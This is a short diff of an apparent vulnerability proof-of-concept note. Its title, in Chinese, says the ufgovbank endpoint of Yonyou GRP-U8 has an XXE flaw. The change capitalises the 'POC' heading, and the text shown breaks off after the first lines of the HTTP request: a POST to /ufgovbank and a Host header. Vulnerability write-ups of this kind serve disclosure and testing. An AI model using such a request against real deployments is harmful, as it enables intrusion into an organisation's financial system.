@@ -1,6 +1,6 @@
 ## 用友GRP-U8-ufgovbank存在XXE漏洞
 
-## poc
+## POC
 ```
 POST /ufgovbank HTTP/1.1
 Host: 172.16.135.21:8009
